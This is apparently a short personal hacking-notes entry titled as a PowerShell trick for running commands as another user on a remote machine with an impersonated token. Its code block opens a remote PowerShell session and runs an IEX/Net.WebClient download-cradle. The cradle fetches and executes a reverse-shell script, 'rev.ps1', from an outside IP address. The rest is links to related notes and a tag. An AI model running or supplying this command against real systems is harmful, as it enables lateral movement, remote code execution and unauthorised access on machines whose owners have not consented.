# powershell tricks run powershell commands as another user on remote machine with impersonated token
```powershell
$sess = New-PSSession -computer ComputerHostname
# reverse powershell
Invoke-Command -Session $sess -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://192.168.1.69/rev.ps1') }
```

# References
- [20221003150475](/zet/20221003150475/) powershell tricks run powershell commands as another user
- [20221003150471](/zet/20221003150471/) powershell tricks run powershell commands as another user on remote machine with impersonated token copy and run file over session
- ~/kb/hacking/powershell/powershell-tricks.md

Tags:
    #assorted

